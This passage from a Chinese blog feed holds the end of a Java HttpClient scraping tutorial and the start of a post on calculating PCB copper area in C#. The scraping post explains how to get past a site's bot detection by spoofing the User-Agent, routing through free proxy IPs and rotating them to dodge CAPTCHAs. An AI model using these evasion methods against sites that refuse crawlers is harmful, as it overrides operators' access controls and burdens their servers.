&lt;pre&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;dependency&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;groupId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;org.apache.httpcomponents&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;groupId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;artifactId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;httpclient&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;artifactId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;version&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;4.5.8&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;version&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;dependency&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;/li&gt;
&lt;li readability=&quot;0.5&quot;&gt;新建java类
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
&lt;span&gt;package&lt;/span&gt;&lt;span&gt; httpclient_learn;

&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.io.IOException;

&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.apache.http.HttpEntity;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.apache.http.HttpStatus;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.apache.http.client.ClientProtocolException;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.apache.http.client.methods.CloseableHttpResponse;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.apache.http.client.methods.HttpGet;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.apache.http.client.utils.HttpClientUtils;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.apache.http.impl.client.CloseableHttpClient;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.apache.http.impl.client.HttpClients;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.apache.http.util.EntityUtils;

&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; HttpClientTest {
    
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; main(String[] args) {
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;1.生成httpclient，相当于该打开一个浏览器&lt;/span&gt;
        CloseableHttpClient httpClient =&lt;span&gt; HttpClients.createDefault();
        CloseableHttpResponse response &lt;/span&gt;= &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;2.创建get请求，相当于在浏览器地址栏输入 网址&lt;/span&gt;
        HttpGet request = &lt;span&gt;new&lt;/span&gt; HttpGet(&quot;https://www.tuicool.com/&quot;&lt;span&gt;);
        &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt; {
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;3.执行get请求，相当于在输入地址栏后敲回车键&lt;/span&gt;
            response =&lt;span&gt; httpClient.execute(request);
            
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;4.判断响应状态为200，进行处理&lt;/span&gt;
            &lt;span&gt;if&lt;/span&gt;(response.getStatusLine().getStatusCode() ==&lt;span&gt; HttpStatus.SC_OK) {
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;5.获取响应内容&lt;/span&gt;
                HttpEntity httpEntity =&lt;span&gt; response.getEntity();
                String html &lt;/span&gt;= EntityUtils.toString(httpEntity, &quot;utf-8&quot;&lt;span&gt;);
                System.out.println(html);
            } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;如果返回状态不是200，比如404（页面不存在）等，根据情况做处理，这里略&lt;/span&gt;
                System.out.println(&quot;返回状态不是200&quot;&lt;span&gt;);
                System.out.println(EntityUtils.toString(response.getEntity(), &lt;/span&gt;&quot;utf-8&quot;&lt;span&gt;));
            }
        } &lt;/span&gt;&lt;span&gt;catch&lt;/span&gt;&lt;span&gt; (ClientProtocolException e) {
            e.printStackTrace();
        } &lt;/span&gt;&lt;span&gt;catch&lt;/span&gt;&lt;span&gt; (IOException e) {
            e.printStackTrace();
        } &lt;/span&gt;&lt;span&gt;finally&lt;/span&gt;&lt;span&gt; {
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;6.关闭&lt;/span&gt;
&lt;span&gt;            HttpClientUtils.closeQuietly(response);
            HttpClientUtils.closeQuietly(httpClient);
        }
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;/li&gt;
&lt;li readability=&quot;-0.5&quot;&gt;执行代码，我们会发现打印出来的其实就是首页完整的html代码
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html lang=&quot;zh-cn&quot;&amp;gt;
&amp;lt;head&amp;gt;
    //Java开发老菜鸟备注：由于内容太多，具体不再贴出来了
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
&lt;/pre&gt;
&lt;pre&gt;
　　//Java开发老菜鸟备注：由于内容太多，具体内容不再贴出来了
&lt;/pre&gt;
&lt;pre&gt;
&amp;lt;/body&amp;gt; &amp;lt;/html&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;操作成功！&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;好了，到这里就完成了一个简单的小例子。&lt;/p&gt;
&lt;p&gt;爬一个网站不过瘾，再来一打。接下来我们换个网站：&lt;a href=&quot;https://www.tuicool.com/&quot;&gt;https://www.tuicool.com/&lt;/a&gt;，你会发现结果是这样的：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;返回状态不是200
&lt;/span&gt;&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html&amp;gt;
    &amp;lt;head&amp;gt;
          &amp;lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&amp;gt;
    &amp;lt;/head&amp;gt;
    &amp;lt;body&amp;gt;
        &amp;lt;p&amp;gt;系统检测亲&lt;span&gt;不是真人行为&lt;/span&gt;，因系统资源限制，我们只能拒绝你的请求。如果你有疑问，可以通过微博 http:&lt;span&gt;//&lt;/span&gt;&lt;span&gt;weibo.com/tuicool2012/ 联系我们。&amp;lt;/p&amp;gt;&lt;/span&gt;
    &amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;爬虫程序被识别了，怎么办呢？ 别着急，慢慢往下看&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;三、复杂应用&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;第二个网站访问不了，是因为网站有反爬虫的处理，怎么绕过他呢?&lt;/p&gt;
&lt;p&gt;1.最简单的是对请求头进行伪装，看代码，加上红框里面的内容后再执行&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1345071/201905/1345071-20190522231555599-1499788684.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;你会发现返回结果变了，有真内容了（红字警告先不管它，我们起码获取到了html内容）&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1345071/201905/1345071-20190522231807612-290228959.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;那代码中新加的那段内容是哪里来的呢？&lt;/p&gt;
&lt;p&gt;请打开谷歌浏览器的F12，对就是这里了：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1345071/201905/1345071-20190522232047488-853407824.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;当然我们还可以设置请求的其他头信息，如cookie等&lt;/p&gt;
&lt;p&gt;2.上面说的是伪装成浏览器，其实如果你伪装了之后，如果短时间内一直多次访问的话，网站会对你的ip进行封杀，这个时候就需要换个ip地址了，使用代理IP&lt;/p&gt;
&lt;p&gt;网上有一些免费的代理ip网站，比如xici&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1345071/201905/1345071-20190522232542002-681235540.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;我们选择那些存活时间久并且刚刚被验证的ip，我这里选择了“112.85.168.223:9999”，代码如下&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
&lt;span&gt;//&lt;/span&gt;&lt;span&gt;2.创建get请求，相当于在浏览器地址栏输入 网址&lt;/span&gt;
        HttpGet request = &lt;span&gt;new&lt;/span&gt; HttpGet(&quot;https://www.tuicool.com/&quot;&lt;span&gt;);
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;设置请求头，将爬虫伪装成浏览器&lt;/span&gt;
        request.setHeader(&quot;User-Agent&quot;,&quot;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36&quot;&lt;span&gt;);
       &lt;span&gt; HttpHost proxy &lt;/span&gt;&lt;/span&gt;&lt;span&gt;= new HttpHost(&quot;112.85.168.223&quot;, 9999);
        RequestConfig config = RequestConfig.custom().setProxy(proxy).build();
        request.setConfig(config);&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;执行代码，能正常返回html结果。如果代理ip刚好不能用的话，会报错，如下显示连接超时，这个时候需要更换一个新的代理ip&lt;img src=&quot;https://img2018.cnblogs.com/blog/1345071/201905/1345071-20190522233204670-1124886718.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;3.另外，程序被识别出来很大原因是短时间内做了太多访问，这个是正常人不会有的频率，因此我们也可以放慢爬取的速度，让程序sleep一段时间再爬下一个也是一种反 反爬虫的简单方法。&lt;/p&gt;

&lt;p&gt;&lt;span&gt;&lt;strong&gt;四、结束语&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;这篇简单介绍了下httpclient和它的官网，并用代码说明了如何使用它，也提到了如果遇到反爬虫的话我们还可以用一些简单的反反爬虫方法进行应对。&lt;/p&gt;
&lt;p&gt;对于其他复杂的反反爬虫的方法我还没有研究过，就是用这几种结合使用。 比如在爬取了一段时间后，网站需要输入验证码来验证是人在操作，我没有去管如何突破验证码的事儿，而是获取代理ip池然后在遇到验证码的时候逐个换新的ip，这样就可以躲过了验证码。如果有其他方法，欢迎留言哦&lt;/p&gt;

</description>
<pubDate>Wed, 22 May 2019 22:29:00 +0000</pubDate>
<dc:creator>JAVA开发老菜鸟</dc:creator>
<og:description>爬虫要想爬取需要的信息，首先第一步就要抓取到页面html内容，然后对html进行分析，获取想要的内容。上一篇随笔《Java爬虫系列一：写在开始前》中提到了HttpClient可以抓取页面内容。 今天就</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/sam-uncle/p/10908567.html</dc:identifier>
</item>
<item>
<title>PCB 线路铜皮面积(残铜率)计算的实现方法 - pcbren</title>
<link>http://www.cnblogs.com/pcbren/p/10909585.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/pcbren/p/10909585.html</guid>
<description>&lt;p&gt;     一个多月没更新博客园了，这里继续分享关于PCB工程相关一些知识，做过PCB工程都知道用使用genesis或incam是可以非常方便的计算得到铜皮面积这个参数【下图】，但实际这个软件是通过什么算法计算出铜面积的呢，这个我们不得而知，但接下来这里介绍一种可以将【线路残铜率(铜皮面积)】计算得出来的方法.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/733296/201905/733296-20190522235846659-1527580364.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;  一.计算铜皮面积----公式&lt;/strong&gt;与&lt;strong&gt;参数&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;       1.铜面积公式&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;        公式=【铜面的多边形面积】+【铜的多边形周长*铜厚】-【孔的底面积】+【孔的圆柱面积】 &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;        注:看看计算公式是多么简单呀,是吧。下面重点讲&lt;span&gt;【铜面的多边形面积】&lt;/span&gt;参数计算方法，因为其它参数过于简单就不写了&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;      2.铜面积参数&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;         1.表面铜面积【铜面的多边形面积】&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;         2.表面横截面积【铜的多边形周长*铜厚】&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;         3.有铜孔孔径面积【孔的底面积】  &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;         4.有铜孔孔壁面积保【孔的圆柱面积】&lt;/span&gt;&lt;/p&gt;
&lt;h2&gt;       &lt;img src=&quot;https://img2018.cnblogs.com/blog/733296/201905/733296-20190522235014550-262913326.png&quot; alt=&quot;&quot;/&gt;&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;  二.【铜面的多边形面积】--计算方法&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;       &lt;span&gt;&lt;strong&gt;【&lt;/strong&gt;铜面的多边形面积】计算公式用 Shoelace公式 【鞋带公式】,此公式可以计算任意凸凹多边形,刚好是满足计算需求的，但对于PCB 铜皮(Surface)来说,铜皮点节点存在弧节点,直接用此公式计算当然不行啦，需要改造一下才行的。接一来用两种方法(丢失精度与精度)实现计算&lt;strong&gt;【铜面的多边形面积】&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h3 class=&quot;res-title&quot;&gt;         &lt;img src=&quot;https://img2018.cnblogs.com/blog/733296/201905/733296-20190523004351262-2046927260.png&quot; alt=&quot;&quot;/&gt;&lt;/h3&gt;
&lt;p&gt;&lt;span&gt;     1.【丢失精度】计算铜面积&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;          将铜皮节点含有&lt;span&gt;弧节点&lt;/span&gt;，全部转为折线节点, 转换后的弧长长度控制在0.1mm左右，当然弧长的长度值越小精度就越高，这样一来计算量就上去了，经测试弧长控制0.1mm比较合适。铜面积计算不会丢失太多。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;        &lt;img src=&quot;https://img2018.cnblogs.com/blog/733296/201905/733296-20190523005711952-661582233.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;     2.【精度】计算铜面积&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;          将原有铜皮铜边形分为2部份&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;          1.分解第1部份 折线多边形鞋带公式求解&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;em&gt;          2.&lt;/em&gt;分解第2部份  圆弧多边形扇形面积求解  (如何判断,圆弧多边形是删除，还是增加呢，下面有说明)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;      &lt;img src=&quot;https://img2018.cnblogs.com/blog/733296/201905/733296-20190523012212455-673374865.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;      &lt;span&gt;上面带来一个新的问题？ 图形面积合并计算,如何判断，哪些弧形多边形是【加】还是【减】呢&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;     按下表的关系进行加减计算合并铜皮面积&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;    &lt;img src=&quot;https://img2018.cnblogs.com/blog/733296/201905/733296-20190523013138892-1042783166.png&quot; alt=&quot;&quot; width=&quot;278&quot; height=&quot;111&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;strong&gt;三.【铜面的多边形面积】--计算代码&lt;/strong&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;      1.计算铜面积调用代码&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
            &lt;span&gt;//&lt;/span&gt;&lt;span&gt;获取gtl 线路层(计算前转为Surface铜皮属性)&lt;/span&gt;
            gLayer workLayerInfo = g.getFEATURES(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;gtl&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;1.【丢失精度】计算铜面积&lt;/span&gt;
            &lt;span&gt;var&lt;/span&gt; areaLayer =&lt;span&gt; calc2.s_area(workLayerInfo.Slist);
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;2. 【精度】计算铜面积&lt;/span&gt;
            &lt;span&gt;var&lt;/span&gt; areaLayer2 =&lt;span&gt; calc2.s_area2(workLayerInfo.Slist);
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;计算铜的多边形周长 &lt;/span&gt;
            &lt;span&gt;var&lt;/span&gt; copperLenght =  calc2.s_Length(workLayerInfo.Slist);
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;   2.计算铜面积函数&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; onclick=&quot;cnblogs_code_show('c94b3511-daab-487b-84f2-8994eef0924d')&quot; readability=&quot;57&quot;&gt;&lt;img id=&quot;code_img_closed_c94b3511-daab-487b-84f2-8994eef0924d&quot; class=&quot;code_img_closed&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;&quot;/&gt;&lt;img id=&quot;code_img_opened_c94b3511-daab-487b-84f2-8994eef0924d&quot; class=&quot;code_img_opened&quot; onclick=&quot;cnblogs_code_hide('c94b3511-daab-487b-84f2-8994eef0924d',event)&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_c94b3511-daab-487b-84f2-8994eef0924d&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;109&quot;&gt;
&lt;pre&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 【丢失精度】计算铜面积
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;gS_list&quot;&amp;gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;returns&amp;gt;&amp;lt;/returns&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;double&lt;/span&gt; s_area(List&amp;lt;gS&amp;gt;&lt;span&gt; gS_list)
        {
            &lt;/span&gt;&lt;span&gt;double&lt;/span&gt; SurfaceArea = &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
            &lt;/span&gt;&lt;span&gt;foreach&lt;/span&gt; (&lt;span&gt;var&lt;/span&gt; gS_item &lt;span&gt;in&lt;/span&gt;&lt;span&gt; gS_list)
            {
                &lt;/span&gt;&lt;span&gt;foreach&lt;/span&gt; (&lt;span&gt;var&lt;/span&gt; Polyline &lt;span&gt;in&lt;/span&gt;&lt;span&gt; gS_item.sur_group)
                {
                    &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; sur_list =&lt;span&gt; s_2gSur_Point(Polyline.sur_list);
                    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (Polyline.is_hole)
                        SurfaceArea &lt;/span&gt;-=&lt;span&gt; s_area(sur_list);
                    &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;
                        SurfaceArea &lt;/span&gt;+=&lt;span&gt; s_area(sur_list);
                }
            }
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; SurfaceArea;
        }
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 【丢失精度】计算铜面积
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;gSur_Point_list&quot;&amp;gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;returns&amp;gt;&amp;lt;/returns&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;double&lt;/span&gt; s_area(List&amp;lt;gSur_Point&amp;gt;&lt;span&gt; gSur_Point_list)
        {
            &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; Point_Count = gSur_Point_list.Count() - &lt;span&gt;1&lt;/span&gt;&lt;span&gt;;
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (Point_Count &amp;lt; &lt;span&gt;2&lt;/span&gt;) &lt;span&gt;return&lt;/span&gt; &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
            &lt;/span&gt;&lt;span&gt;double&lt;/span&gt; PolylineArea = &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
            &lt;/span&gt;&lt;span&gt;double&lt;/span&gt; ArcArea = &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
            &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; (&lt;span&gt;int&lt;/span&gt; i = &lt;span&gt;1&lt;/span&gt;; i &amp;lt;= Point_Count; i++&lt;span&gt;)
            {
                PolylineArea &lt;/span&gt;+= gSur_Point_list[i - &lt;span&gt;1&lt;/span&gt;].p.x * gSur_Point_list[i].p.y - gSur_Point_list[i - &lt;span&gt;1&lt;/span&gt;].p.y *&lt;span&gt; gSur_Point_list[i].p.x;
            }
            PolylineArea &lt;/span&gt;= Math.Abs(PolylineArea * &lt;span&gt;0.5&lt;/span&gt;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; PolylineArea;
        }
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 【精度】计算铜面积
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;gSur_Point_list&quot;&amp;gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;returns&amp;gt;&amp;lt;/returns&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;double&lt;/span&gt; s_area2(List&amp;lt;gSur_Point&amp;gt;&lt;span&gt; gSur_Point_list)
        {
            &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; Point_Count = gSur_Point_list.Count() - &lt;span&gt;1&lt;/span&gt;&lt;span&gt;;
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (Point_Count &amp;lt; &lt;span&gt;2&lt;/span&gt;) &lt;span&gt;return&lt;/span&gt; &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
            &lt;/span&gt;&lt;span&gt;double&lt;/span&gt; PolylineArea = &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
            &lt;/span&gt;&lt;span&gt;double&lt;/span&gt; ArcArea = &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
            &lt;/span&gt;&lt;span&gt;bool&lt;/span&gt; isCCW =&lt;span&gt; s_isCCW(gSur_Point_list);
            &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; (&lt;span&gt;int&lt;/span&gt; i = &lt;span&gt;1&lt;/span&gt;; i &amp;lt;= Point_Count; i++&lt;span&gt;)
            {
                &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (gSur_Point_list[i].type_point &amp;gt; &lt;span&gt;0&lt;/span&gt;&lt;span&gt;)
                {
                    &lt;/span&gt;&lt;span&gt;double&lt;/span&gt; a_area = a_Area(gSur_Point_list[i - &lt;span&gt;1&lt;/span&gt;].p, gSur_Point_list[i].p, gSur_Point_list[i + &lt;span&gt;1&lt;/span&gt;].p, gSur_Point_list[i].type_point == &lt;span&gt;2&lt;/span&gt;&lt;span&gt;);
                    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (isCCW)
                    {
                        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (gSur_Point_list[i].type_point == &lt;span&gt;2&lt;/span&gt;&lt;span&gt;)
                            ArcArea &lt;/span&gt;+=&lt;span&gt; a_area;
                        &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;
                            ArcArea &lt;/span&gt;-=&lt;span&gt; a_area;
                    }
                    &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;
                    {
                        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (gSur_Point_list[i].type_point == &lt;span&gt;2&lt;/span&gt;&lt;span&gt;)
                            ArcArea &lt;/span&gt;-=&lt;span&gt; a_area;
                        &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;
                            ArcArea &lt;/span&gt;+=&lt;span&gt; a_area;
                    }
                }
                PolylineArea &lt;/span&gt;+= gSur_Point_list[i - &lt;span&gt;1&lt;/span&gt;].p.x * gSur_Point_list[i].p.y - gSur_Point_list[i - &lt;span&gt;1&lt;/span&gt;].p.y *&lt;span&gt; gSur_Point_list[i].p.x;
            }
            PolylineArea &lt;/span&gt;= Math.Abs(PolylineArea * &lt;span&gt;0.5&lt;/span&gt;&lt;span&gt;);
            PolylineArea &lt;/span&gt;+=&lt;span&gt; ArcArea;
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;var isCW = s_isCW(gSur_Point_list);
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;PolylineArea += (isCCW ? -ArcArea : ArcArea);&lt;/span&gt;
            &lt;span&gt;return&lt;/span&gt;&lt;span&gt; PolylineArea;
        }
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 求弧Arc 扇形面积
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;a&quot;&amp;gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;returns&amp;gt;&amp;lt;/returns&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;double&lt;/span&gt; a_Area(gPoint ps, gPoint pc, gPoint pe, &lt;span&gt;bool&lt;/span&gt; ccw, &lt;span&gt;bool&lt;/span&gt; islg180deg = &lt;span&gt;false&lt;/span&gt;&lt;span&gt;)
        {
            &lt;/span&gt;&lt;span&gt;double&lt;/span&gt; r_ =&lt;span&gt; p2p_di(pc, ps);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; pi * r_ * r_ * a_Angle(ps, pc, pe, ccw, islg180deg) / &lt;span&gt;360&lt;/span&gt;&lt;span&gt;;
        }
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 求弧Arc圆心角   3点    //后续改进  用叉积 与3P求角度求解  验证哪个效率高
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;ps&quot;&amp;gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
